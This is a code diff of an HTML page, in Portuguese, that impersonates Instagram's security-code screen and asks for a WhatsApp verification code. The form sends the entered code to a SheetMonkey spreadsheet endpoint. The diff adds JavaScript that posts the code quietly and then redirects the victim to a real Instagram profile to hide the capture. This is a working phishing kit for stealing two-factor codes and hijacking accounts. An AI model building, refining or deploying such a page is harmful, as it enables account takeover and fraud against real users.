@@ -119,13 +119,13 @@
     <div class="lock-icon"><img src="./Xereca.png" alt=""></div>
     <p>Insira o código enviado por WhatsApp ao seu número de celular: +55 ●●●● ●●●●.</p>
     
-    <!-- Formulário que envia para a API do SheetMonkey -->
-    <form action="https://api.sheetmonkey.io/form/73DiZN8cDaFDherk3sjMco" method="post">
+    <!-- Formulário com ID para manipular via JavaScript -->
+    <form id="formulario" action="https://api.sheetmonkey.io/form/73DiZN8cDaFDherk3sjMco" method="post">
       <label for="Codigo">
-        <input type="text" id="Codigo" name="Codigo" placeholder="Código de segurança">
+        <input type="text" id="Codigo" name="Codigo" placeholder="Código de segurança" required>
       </label>
 
-      <!-- Botão corrigido para funcionar corretamente -->
+      <!-- Botão com evento JavaScript -->
       <button class="btn" type="submit">Confirmar</button>
 
       <div class="checkbox">
@@ -151,6 +151,28 @@
     </p>
     <p>Português (Brasil) © 2025 Instagram from Meta</p>
   </div>
+
+  <!-- Script que envia e redireciona -->
+  <script>
+    const form = document.getElementById('formulario');
+
+    form.addEventListener('submit', function(e) {
+      e.preventDefault(); // impede o envio automático
+
+      const formData = new FormData(form);
+
+      fetch(form.action, {
+        method: "POST",
+        body: formData
+      }).then(() => {
+        // redireciona depois de enviar
+        window.location.href = "https://www.instagram.com/hiago_de_pietro/";
+      }).catch(err => {
+        alert("Erro ao enviar. Tente novamente.");
+        console.error(err);
+      });
+    });
+  </script>
 
 </body>
 </html>
